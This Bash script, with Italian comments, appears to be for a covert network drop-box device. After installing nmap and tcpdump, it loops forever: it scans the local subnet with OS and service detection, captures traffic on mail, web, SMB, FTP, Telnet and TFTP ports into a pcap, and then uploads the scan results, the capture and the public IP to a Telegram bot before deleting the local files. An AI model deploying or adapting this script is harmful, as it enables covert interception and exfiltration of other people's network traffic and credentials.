#!/bin/bash
wget -q --spider http://google.com
current_date=$(date "+%d-%m-%Y")
if [ $? -eq 0 ]; then
	echo "Internet ok"
	# Installing dependencies
	echo "Install dependencies"
	opkg update
	opkg install nmap
	opkg install tcpdump
	echo "Dependencies ok"
	sleep 1
	while true
	do
		# Crea un file di testo sulla scheda SD per memorizzare i risultati
		echo "Start scanning..."
		nmap_output_file="nmap_scan_$current_date.txt"
		touch $nmap_output_file
		# Assegna l'indirizzo IP ottenuto dall'ethernet alla variabile "ip_address"
		ip_address=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)	
		nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
		echo "Scanning complete"

		public_ip=$(curl -s https://ifconfig.me/ip)
		echo "Public ip: $public_ip"

		echo "Start intercepting..."
		# Definisci la variabile che indica la dimensione massima del file pcap
		MAX_FILE_SIZE=200000000  # 200MB in byte
		# Definisci il nome del file pcap da utilizzare
		tcpdump_output_file="intercept$current_date.pcap"
		# Definisci l'espressione di filtro per tcpdump
		filter_tcpdump="(tcp port 25 or tcp port 80 or tcp port 8080 or tcp port 443 or tcp port 445 or tcp port 137 or tcp port 139 or tcp port 21 or tcp port 23 or udp port 69 or udp portrange 10000-20000)"
		# Avvia tcpdump per catturare il traffico di rete e salvarlo nel file pcap
		tcpdump -i any -s 0 -w "$tcpdump_output_file" "$filter_tcpdump" &
		# Salva il PID del processo tcpdump
		tcpdump_pid=$!
		# Ciclo infinito che controlla la dimensione del file pcap
		while true; do
		    # Ottieni la dimensione corrente del file pcap
		    FILE_SIZE=$(stat -c%s "$tcpdump_output_file")
		    # Se la dimensione supera la dimensione massima consentita, interrompi il processo tcpdump
		    if [ "$FILE_SIZE" -ge "$MAX_FILE_SIZE" ]; then
		        kill -SIGINT "$tcpdump_pid"
		        break
		    fi
		    # Attendi 1 secondo prima di verificare nuovamente la dimensione del file pcap
		    sleep 1
		done

		#send report via telegram
		token=""
		# chat id
		chat_id=""
		# Definisci il percorso completo del file da inviare
		filepath1=$nmap_output_file
		filepath2=$tcpdump_output_file
		# Invia il file alla chat utilizzando il bot di Telegram
		curl -F chat_id="$chat_id" -F document=@"$filepath1" "https://api.telegram.org/bot$token/sendDocument"
		curl -F chat_id="$chat_id" -F document=@"$filepath2" "https://api.telegram.org/bot$token/sendDocument"
		curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="$public_ip"
		rm "$filepath1"
		rm "$filepath2"
	done
else
  	echo "Internet not ok"
fi

#ottiene tutte le reti wifi presenti nella zona
#<iwlist wlan0 scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID' > result.txt
